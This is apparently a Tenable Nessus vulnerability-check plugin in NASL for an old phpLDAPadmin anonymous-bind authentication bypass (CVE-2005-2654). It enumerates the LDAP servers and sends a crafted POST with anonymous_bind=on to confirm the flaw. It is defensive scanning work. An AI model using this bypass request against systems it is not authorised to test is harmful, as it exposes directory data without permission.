#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server is affected by an authentication bypass issue. 

Description :

The remote host is running phpLDAPadmin, a PHP-based LDAP browser. 

The version of phpLDAPadmin installed on the remote host may allow
access to an LDAP server anonymously, even if anonymous binds have
been disabled in the application's configuration. 

See also : 

http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=322423
http://www.nessus.org/u?4e9c6bc8

Solution : 

Upgrade to phpLDAPadmin 0.9.7-rc1 or later.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:N)";


if (description) {
  script_id(19546);
  script_version ("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2654");
  script_bugtraq_id(14694);

  name["english"] = "phpLDAPadmin Anonymous Bind Security Bypass Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for anonymous bind security bypass vulnerability in phpLDAPadmin";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  req = http_get(item:string(dir, "/tree.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # Get the software version if possible.
  pat = 'class="subtitle".*>phpLDAPadmin - (.+)$';
  matches = egrep(string:res, pattern:pat);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      ver = eregmatch(pattern:pat, string:match);
      if (!isnull(ver)) {
        ver = ver[1];
        break;
      }
    }
  }

  # Iterate over each configured ldap server and try to exploit the flaw.
  server_list = res;
  while (server_list = strstr(server_list, '<tr class="server">')) {
    server_list = strstr(server_list, '<a href="login_form.php?server_id=');

    server = server_list - '<a href="login_form.php?server_id=';
    server = server - strstr(server, '"');

    # Look for an "anonymous bind" checkbox in the login form.
    req = http_get(item:string(dir, "/login_form.php?server_id=", server), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If ...
    if (
      # it looks like like phpLDAPadmin and ...
      '<form action="login.php" method="post" name="login_form">' >< res &&
      '<input type="text" name="login_dn"' >< res &&
      # it doesn't have the "anonymous bind" checkbox.
      'type="checkbox" name="anonymous_bind"' >!< res
    ) {
      # Try to exploit the flaw.
      postdata = string(
        "server_id=", server, "&",
        "anonymous_bind=on"
      );
      req = string(
        "POST ", dir, "/login.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we could do an anonymous bind.
      if (
        "Successfully logged into server" >< res &&
        "(Anonymous Bind)" >< res
      ) {
        security_note(port);
        exit(0);
      }
    }
  }

  # Check the version since the exploit won't works if the
  # LDAP servers don't actually allow anonymous binds.
  if (ver && ver =~ "^0\.9\.([0-5]|6($|[ab]|c($|-[0-4])))") {
    report = string(
      desc["english"],
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Note that Nessus has determined the vulnerability exists on the remote\n",
      "host simply by looking at the version number of phpLDAPadmin installed\n",
      "there.\n"
    );
    security_note(port:port, data:report);
    exit(0);
  }
}
